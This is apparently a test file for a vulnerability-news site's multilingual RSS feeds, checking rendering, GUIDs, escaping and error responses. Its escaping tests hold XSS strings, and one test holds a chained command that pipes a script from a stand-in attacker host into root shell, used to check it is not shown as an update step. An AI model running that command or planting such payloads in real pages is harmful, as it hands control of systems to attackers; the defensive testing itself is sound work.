// The RSS feeds' renderer and response (ticket incident-pages/01), behind a fake R2 binding.
import assert from 'node:assert/strict';
import { test } from 'node:test';
import { allFeedResponse, feedResponse, productFeedResponse } from '../edge/feed.mjs';
import { slug } from '../web/board.mjs';

const bucket = (doc) => ({ get: async (key) => (key === 'board/feed.json' && doc ? { text: async () => JSON.stringify(doc) } : null) });

const SSHOLE = {
  id: 'CVE-2026-123158', cves: ['CVE-2026-123158'], first_seen: '2026-11-06T00:46:00Z', published: '2026-11-05T10:00:00Z',
  brief: { text: 'sshole' },
  summary: {
    ko: { title: 'OpenSSH sshd 인증 우회 (sshole)', easy: '리눅스 서버가 뚫릴 수 있습니다!', summary: 'musl 기반에서만 해당합니다.', mitigation: '9.9p2로 업데이트하세요.' },
    en: { title: 'OpenSSH sshd authentication bypass (sshole)', easy: 'Linux servers can be broken into!', summary: 'Only musl-based systems.', mitigation: 'Update to 9.9p2.' },
  },
};
const STORY = { id: 'https://news.ycombinator.com/item?id=50378228', cves: [], first_seen: '2026-11-05T09:00:00Z', brief: { text: 'sshole' } };

test('slugs never change: a CVE ID as is, an HN story by its item, any other URL by a short hash', async () => {
  assert.equal(await slug('CVE-2026-123158'), 'CVE-2026-123158');
  assert.equal(await slug(STORY.id), 'hn-50378228');
  const other = await slug('https://www.bleepingcomputer.com/news/security/nikke/');
  assert.match(other, /^u-[0-9a-f]{12}$/);
  assert.equal(other, await slug('https://www.bleepingcomputer.com/news/security/nikke/'));
});

test('the Korean and English feeds carry each Incident in their language, linked to their Incident pages', async () => {
  const doc = { incidents: [SSHOLE, STORY] };
  const ko = await (await feedResponse(bucket(doc), 'ko')).text();
  assert.match(ko, /<language>ko<\/language>/);
  assert.match(ko, /<title>OpenSSH sshd 인증 우회 \(sshole\)<\/title>/);
  assert.match(ko, /<link>https:\/\/patchticker.com\/i\/CVE-2026-123158<\/link>/);
  assert.match(ko, /<guid isPermaLink="false">https:\/\/patchticker.com\/i\/CVE-2026-123158<\/guid>/);
  assert.match(ko, /<pubDate>Thu, 05 Nov 2026 10:00:00 GMT<\/pubDate>/);
  assert.match(ko, /&lt;b&gt;대처법&lt;\/b&gt;&lt;\/p&gt;&lt;p&gt;9.9p2로 업데이트하세요./);
  assert.match(ko, /<link>https:\/\/patchticker.com\/i\/hn-50378228<\/link>/);
  const en = await (await feedResponse(bucket(doc), 'en')).text();
  assert.match(en, /<atom:link href="https:\/\/patchticker.com\/en\/feed.xml"/);
  assert.match(en, /<guid isPermaLink="false">https:\/\/patchticker.com\/en\/i\/hn-50378228<\/guid>/); // unchanged since ticket 01
  assert.match(en, /<link>https:\/\/patchticker.com\/en\/i\/hn-50378228<\/link>/);
  assert.match(en, /<title>sshole<\/title>/); // no Summary: the Brief
});

test('the Japanese feed is in Japanese words with the English Summary, linked to the Japanese pages', async () => {
  const ja = await (await feedResponse(bucket({ incidents: [SSHOLE] }), 'ja')).text();
  assert.match(ja, /<language>ja<\/language>/);
  assert.match(ja, /<atom:link href="https:\/\/patchticker.com\/ja\/feed.xml"/);
  assert.match(ja, /<title>OpenSSH sshd authentication bypass \(sshole\)<\/title>/);
  assert.match(ja, /<link>https:\/\/patchticker.com\/ja\/i\/CVE-2026-123158<\/link>/);
  assert.match(ja, /&lt;b&gt;対処法&lt;\/b&gt;&lt;\/p&gt;&lt;p&gt;Update to 9.9p2./);
});

test('the GUID stays when the Summary is rewritten', async () => {
  const before = await (await feedResponse(bucket({ incidents: [SSHOLE] }), 'ko')).text();
  const rewritten = { ...SSHOLE, summary: { ...SSHOLE.summary, ko: { ...SSHOLE.summary.ko, title: '새 제목' } } };
  const after = await (await feedResponse(bucket({ incidents: [rewritten] }), 'ko')).text();
  const guid = (xml) => /<guid[^>]*>([^<]*)<\/guid>/.exec(xml)[1];
  assert.equal(guid(after), guid(before));
});

test('hostile text from a source cannot break out of the feed', async () => {
  const hostile = { ...SSHOLE, summary: { ...SSHOLE.summary, ko: { title: '</title><script>alert(1)</script>', easy: '<img src=x onerror=alert(1)>' } } };
  const xml = await (await feedResponse(bucket({ incidents: [hostile] }), 'ko')).text();
  assert.doesNotMatch(xml, /<script>|<img /);
  assert.match(xml, /&lt;\/title&gt;&lt;script&gt;/);
  assert.match(xml, /&amp;lt;img src=x onerror=alert\(1\)&amp;gt;/); // escaped inside the escaped HTML body
});

test('a control character XML does not allow, in a title from the web, is dropped instead of breaking the whole feed', async () => {
  const bad = String.fromCharCode(1, 0x1b, 0xfffe);
  const story = { ...STORY, brief: { text: `HN${bad} story\ttab` } };
  const xml = await (await feedResponse(bucket({ incidents: [story] }), 'en')).text();
  assert.match(xml, /<title>HN story\ttab<\/title>/); // tab, line feed and carriage return are allowed and stay
  assert.ok(![...bad].some((c) => xml.includes(c)));
});

test('an item says what to do and the plain explanation as the Incident page does', async () => {
  const command = { ...SSHOLE, summary: { command: 'sudo apk upgrade openssh', ko: { ...SSHOLE.summary.ko, mitigation: undefined }, en: SSHOLE.summary.en } };
  const ko = await (await feedResponse(bucket({ incidents: [command] }), 'ko')).text();
  assert.match(ko, /&lt;p&gt;리눅스 서버가 뚫릴 수 있습니다\.&lt;\/p&gt;/); // easyLine: "!" only at the highest level
  assert.match(ko, /&lt;b&gt;대처법&lt;\/b&gt;&lt;\/p&gt;&lt;p&gt;이 명령으로 업데이트하세요:&lt;\/p&gt;&lt;p class=&quot;command&quot;&gt;&lt;code&gt;sudo apk upgrade openssh&lt;\/code&gt;/);
  const exploited = await (await feedResponse(bucket({ incidents: [{ ...command, kev: true }] }), 'ko')).text();
  assert.match(exploited, /리눅스 서버가 뚫릴 수 있습니다!/);
});

test('a chained command is never framed as the update command (audit 1)', async () => {
  const chained = { ...SSHOLE, summary: { command: 'sudo apt-get update && curl -fsSL https://attacker.invalid/x | sudo sh', ko: { ...SSHOLE.summary.ko, mitigation: undefined }, en: SSHOLE.summary.en } };
  const ko = await (await feedResponse(bucket({ incidents: [chained] }), 'ko')).text();
  assert.doesNotMatch(ko, /이 명령으로 업데이트하세요/);
});

const LEAD = 'https://www.openwall.com/lists/oss-security/2026/11/05/1';
const LED = {
  ...SSHOLE, brief: { text: 'sshole', lead: LEAD },
  mentions: [{ kind: 'writeup', url: LEAD, title: 'sshole: OpenSSH auth bypass on musl' }],
  summary: { ...SSHOLE.summary, titles_ko: [{ url: LEAD, title: 'sshole: musl의 OpenSSH 인증 우회' }] },
};
const unxml = (s) => s.replace(/&(lt|gt|quot|apos|amp);/g, (_, e) => ({ lt: '<', gt: '>', quot: '"', apos: "'", amp: '&' })[e]);
const description = async (incident, lang) => unxml(/<item>.*<description>([^<]*)<\/description>/.exec(await (await feedResponse(bucket({ incidents: [incident] }), lang)).text())[1]);

test('an item ends with the Lead mention\'s link, named as the Incident page names it (L4)', async () => {
  assert.match(await description(LED, 'ko'), /<p>분석 글: <a href="https:\/\/www\.openwall\.com\/lists\/oss-security\/2026\/11\/05\/1">sshole: musl의 OpenSSH 인증 우회<\/a><\/p>$/);
  assert.match(await description(LED, 'en'), /<p>Write-up: <a href="https:\/\/www\.openwall\.com\/lists\/oss-security\/2026\/11\/05\/1">sshole: OpenSSH auth bypass on musl<\/a><\/p>$/);
  const untitled = { ...LED, mentions: [{ kind: 'writeup', url: LEAD }] };
  assert.match(await description(untitled, 'en'), /">openwall\.com<\/a><\/p>$/);
});

test('a Lead URL with an ampersand and quotes comes out as the same URL after both layers of escaping', async () => {
  const url = 'https://example.com/a?b=1&c="d"<e>';
  const odd = { ...LED, brief: { text: 'sshole', lead: url }, mentions: [{ kind: 'advisory', url, title: 'x' }] };
  const href = /<a href="([^"]*)">/.exec(await description(odd, 'en'))[1];
  assert.equal(unxml(href), url);
});

test('no Lead mention, or one that is not http(s), gives no link', async () => {
  for (const lead of [undefined, 'javascript:alert(1)']) {
    const incident = { ...LED, brief: { text: 'sshole', lead }, mentions: [{ kind: 'writeup', url: lead, title: 'x' }] };
    assert.doesNotMatch(await description(incident, 'en'), /<a /);
  }
});

test("a CVE record vendor named like an Object.prototype key does not take the feed down (audit 2)", async () => {
  const odd = { ...SSHOLE, products: [{ id: 'constructor:foo', name: 'Foo' }], summary: { ...SSHOLE.summary, products: [] } };
  const res = await feedResponse(bucket({ incidents: [odd] }), 'ko');
  assert.equal(res.status, 200);
});

test('503, never a runtime error or a half feed, for a document the feed cannot use', async () => {
  for (const doc of [{ incidents: 'oops' }, { incidents: [null] }]) {
    const res = await feedResponse(bucket(doc), 'ko');
    assert.equal(res.status, 503);
    assert.match(await res.text(), /^The RSS feed is unavailable right now\./);
  }
});

test('answers RSS with a short cache, and 503 when the store cannot be read', async () => {
  const ok = await feedResponse(bucket({ incidents: [] }), 'ko');
  assert.equal(ok.status, 200);
  assert.equal(ok.headers.get('content-type'), 'application/rss+xml; charset=utf-8');
  assert.match(ok.headers.get('cache-control'), /max-age=300/);
  assert.equal((await feedResponse(bucket(null), 'ko')).status, 503);
  assert.equal((await feedResponse({ get: async () => { throw new Error('R2 down'); } }, 'en')).status, 503);
});

// Owner, 11-17: a reader filters by category. Each item names its products as the row shows them (rowTags: operating
// systems first) and its level in the feed's language; the text is escaped like every other.
test('an item carries its products as the row shows them and its level, as categories in the feed language', async () => {
  const tagged = { ...SSHOLE, cvss: 9.8, summary: { ...SSHOLE.summary, products: ['OpenSSH', 'A&B <x>'], platforms: ['Linux'] } };
  const cats = (xml) => [...xml.matchAll(/<category>([^<]*)<\/category>/g)].map((m) => m[1]);
  assert.deepEqual(cats(await (await feedResponse(bucket({ incidents: [tagged] }), 'ko')).text()), ['Linux', 'OpenSSH', 'A&amp;B &lt;x&gt;', '긴급']);
  assert.deepEqual(cats(await (await feedResponse(bucket({ incidents: [tagged] }), 'en')).text()), ['Linux', 'OpenSSH', 'A&amp;B &lt;x&gt;', 'Urgent']);
  assert.deepEqual(cats(await (await feedResponse(bucket({ incidents: [STORY] }), 'en')).text()), ['Notice']); // no products: the level alone
});

// The products feed (owner, 11-17): /feed.xml?products=<names>, matched as /api/check matches (no model), from the check
// documents alone (collector/checks.py entry: no Summary, no page documents read per request).
const SSH_SLUG = 'a1b2c3d4e5f60718';
const NGINX_SLUG = '0f1e2d3c4b5a6978';
const at = (h) => `2026-11-1${h}T00:00:00Z`;
const entryOf = (n, extra = {}) => ({ id: `CVE-2026-${n}`, url: `https://patchticker.com/i/CVE-2026-${n}`, first_seen: at(5), published: at(5),
  level: 'high', exploited: false, cvss: 7.5, cve_count: 1, cves: [`CVE-2026-${n}`], fixed: '', title_en: `Flaw ${n}`, title_ko: `취약점 ${n}`, ...extra });
const CHECK = {
  'check/index.json': { openssh: [SSH_SLUG], nginx: [NGINX_SLUG] },
  [`check/p/${SSH_SLUG}.json`]: { product: 'OpenSSH', id: 'openbsd:openssh', incidents: [
    entryOf(1, { published: at(6), level: 'highest', exploited: true, cvss: 9.8, cve_count: 7, cves: ['CVE-2026-1', 'CVE-2026-2', 'CVE-2026-3', 'CVE-2026-4', 'CVE-2026-5'], fixed: '9.9p2' }),
    entryOf(9, { url: 'https://patchticker.com/#i=CVE-2026-9', first_seen: '2026-09-01T00:00:00Z', published: '2026-09-01T00:00:00Z' })] },
  [`check/p/${NGINX_SLUG}.json`]: { product: 'nginx', id: 'f5:nginx', incidents: [entryOf(4, { published: at(4), level: 'notice' })] },
};
const store = (docs) => ({ get: async (key) => (Object.hasOwn(docs, key) ? { text: async () => JSON.stringify(docs[key]) } : null) });
const ask = (query, lang = 'ko', method = 'GET', docs = CHECK) => productFeedResponse(store(docs), new Request(`https://patchticker.com/feed.xml?${query}`, { method }), lang, Date.parse(at(7)));

test('the products feed lists the asked products\' Incidents newest first, with level, fixed version and CVE count', async () => {
  const res = await ask('products=openssh,NGINX');
  assert.equal(res.status, 200);
  assert.equal(res.headers.get('content-type'), 'application/rss+xml; charset=utf-8');
  const xml = await res.text();
  assert.deepEqual([...xml.matchAll(/<item><title>([^<]*)</g)].map((m) => m[1]), ['취약점 1', '취약점 4']); // CVE-2026-9 is past 30 days
  assert.match(xml, /<title>Patch Ticker · OpenSSH, nginx<\/title>/);
  assert.match(xml, /<link>https:\/\/patchticker.com\/i\/CVE-2026-1<\/link><guid isPermaLink="false">https:\/\/patchticker.com\/i\/CVE-2026-1<\/guid>/);
  assert.match(xml, /<category>OpenSSH<\/category><category>긴급<\/category>/);
  const body = unxml(/<item>.*?<description>([^<]*)<\/description>/.exec(xml)[1]);
  assert.equal(body, '<p>긴급 · 공격 발생 · CVSS 9.8</p><p>고친 버전: 9.9p2</p><p>CVE 7건: CVE-2026-1, CVE-2026-2, CVE-2026-3, CVE-2026-4, CVE-2026-5 외 2건</p>');
  assert.match(xml, /<atom:link href="https:\/\/patchticker.com\/feed.xml\?products=openssh%2CNGINX" rel="self"/);
});

test('the English products feed links the English pages and words; days and min work as in /api/check', async () => {
  const xml = await (await ask('products=openssh&days=90&min=highest', 'en')).text();
  assert.deepEqual([...xml.matchAll(/<item><title>([^<]*)</g)].map((m) => m[1]), ['Flaw 1']); // CVE-2026-9 is below the min
  assert.match(xml, /<link>https:\/\/patchticker.com\/en\/i\/CVE-2026-1<\/link>/);
  assert.match(unxml(xml), /<p>Urgent · Attacked · CVSS 9\.8<\/p><p>Fixed in: 9\.9p2<\/p><p>7 CVEs: CVE-2026-1, .* and 2 more<\/p>/);
  const ja = await (await ask('products=openssh&days=90&min=highest', 'ja')).text();
  assert.deepEqual([...ja.matchAll(/<item><title>([^<]*)</g)].map((m) => m[1]), ['Flaw 1']); // the English title
  assert.match(ja, /<link>https:\/\/patchticker.com\/ja\/i\/CVE-2026-1<\/link>/);
  assert.match(unxml(ja), /<p>緊急 · 攻撃発生 · CVSS 9\.8<\/p><p>修正バージョン: 9\.9p2<\/p>/);
  const all = await (await ask('products=openssh&days=90', 'en')).text();
  assert.match(all, /<link>https:\/\/patchticker.com\/#i=CVE-2026-9<\/link>/); // no page: its row on the Board
});

test('bad input answers as /api/check does; names nothing matches give an empty feed that says so; HEAD has no body', async () => {
  for (const query of ['', 'products=', 'products=openssh&days=0', 'products=openssh&min=low']) {
    const res = await ask(query);
    assert.equal(res.status, 400, query);
    assert.match((await res.json()).error, /^(products|days|min):/);
  }
  const none = await (await ask('products=nosuchthing')).text();
  assert.doesNotMatch(none, /<item>/);
  assert.match(none, /<description>[^<]*nosuchthing[^<]*<\/description>/);
  const head = await ask('products=openssh', 'ko', 'HEAD');
  assert.equal(head.status, 200);
  assert.equal(await head.text(), '');
  assert.equal((await ask('products=openssh', 'ko', 'GET', {})).status, 503); // no index yet
});

test('hostile text in a check document stays text in the products feed', async () => {
  const docs = structuredClone(CHECK);
  docs[`check/p/${SSH_SLUG}.json`].incidents[0].title_ko = '</title><script>alert(1)</script>';
  docs[`check/p/${SSH_SLUG}.json`].product = 'A&B <x>';
  docs[`check/p/${SSH_SLUG}.json`].incidents[0].url = 'javascript:alert(1)';
  const xml = await (await ask('products=openssh', 'ko', 'GET', docs)).text();
  assert.doesNotMatch(xml, /<script>|javascript:/);
  assert.match(xml, /<category>A&amp;B &lt;x&gt;<\/category>/);
});

// The whole-Board feed (owner, 11-17): /feed/all.xml and /en/feed/all.xml from board/feed-all.json, light items of every
// level. Its GUID is the Incident page's address, as /feed.xml's is, so an Incident in both feeds is one item to a
// reader of both, and it stays the same when the Incident gains its page later; its link is where /api/check sends.
const ALL = { incidents: [
  entryOf(1007, { url: 'https://patchticker.com/#i=CVE-2026-1007', level: 'notice', cvss: null, title_ko: 'Brief 7', title_en: 'Brief 7', tags: { ko: [], en: [] } }),
  { ...entryOf(1001, { level: 'highest', exploited: true, cvss: 9.8, fixed: '9.9p2' }), tags: { ko: ['Linux', 'OpenSSH'], en: ['Linux', 'OpenSSH'] } },
  { ...entryOf(0, { id: 'https://example.test/advisory', url: 'https://patchticker.com/#i=https%3A%2F%2Fexample.test%2Fadvisory', cves: [], cve_count: 0 }), tags: { ko: ['그림판'], en: ['Paint'] } },
] };
const allFeed = async (lang, doc = ALL) => allFeedResponse(store(doc ? { 'board/feed-all.json': doc } : {}), lang);

test('the whole-Board feed lists every level as light items, its links where /api/check sends, its GUIDs the page addresses', async () => {
  const res = await allFeed('ko');
  assert.equal(res.status, 200);
  assert.equal(res.headers.get('content-type'), 'application/rss+xml; charset=utf-8');
  assert.match(res.headers.get('cache-control'), /max-age=300/);
  const xml = await res.text();
  assert.match(xml, /<atom:link href="https:\/\/patchticker.com\/feed\/all.xml" rel="self"/);
  const items = [...xml.matchAll(/<item>.*?<\/item>/gs)].map((m) => m[0]);
  assert.equal(items.length, 3);
  assert.match(items[0], /<title>Brief 7<\/title><link>https:\/\/patchticker.com\/#i=CVE-2026-1007<\/link><guid isPermaLink="false">https:\/\/patchticker.com\/i\/CVE-2026-1007<\/guid>/);
  assert.match(items[0], /<category>참고<\/category><description>&lt;p&gt;참고&lt;\/p&gt;&lt;p&gt;CVE 1건: CVE-2026-1007&lt;\/p&gt;<\/description>/);
  assert.match(items[1], /<guid isPermaLink="false">https:\/\/patchticker.com\/i\/CVE-2026-1001<\/guid>.*<category>Linux<\/category><category>OpenSSH<\/category><category>긴급<\/category>/s);
  assert.match(items[2], new RegExp(`<guid isPermaLink="false">https://patchticker.com/i/${await slug('https://example.test/advisory')}</guid>`));
  assert.match(items[2], /<category>그림판<\/category>/);
  const en = await (await allFeed('en')).text();
  assert.match(en, /<link>https:\/\/patchticker.com\/en\/i\/CVE-2026-1001<\/link><guid isPermaLink="false">https:\/\/patchticker.com\/en\/i\/CVE-2026-1001<\/guid>/);
  assert.match(en, /<category>Paint<\/category>/);
  assert.match(en, /<atom:link href="https:\/\/patchticker.com\/en\/feed\/all.xml" rel="self"/);
  const ja = await (await allFeed('ja')).text();
  assert.match(ja, /<link>https:\/\/patchticker.com\/ja\/i\/CVE-2026-1001<\/link><guid isPermaLink="false">https:\/\/patchticker.com\/ja\/i\/CVE-2026-1001<\/guid>/);
  assert.match(ja, /<category>Paint<\/category>/); // the English tags
  assert.match(ja, /<category>参考<\/category>/);
});

test('the whole-Board feed and /feed.xml give an Incident the same GUID', async () => {
  const guid = (xml) => /<guid[^>]*>([^<]*)<\/guid>/.exec(xml)[1];
  for (const lang of ['ko', 'en']) {
    const main = await (await feedResponse(bucket({ incidents: [SSHOLE] }), lang)).text();
    const all = await (await allFeedResponse(store({ 'board/feed-all.json': { incidents: [{ ...entryOf(123158), tags: { ko: [], en: [] } }] } }), lang)).text();
    assert.equal(guid(all), guid(main), lang);
  }
});

test('until the collector has written its document the whole-Board feed answers 503, as the other feed does', async () => {
  const res = await allFeed('ko', null);
  assert.equal(res.status, 503);
  assert.match(await res.text(), /^The RSS feed is unavailable right now\./);
  assert.equal((await allFeed('en', { incidents: 'oops' })).status, 503);
});
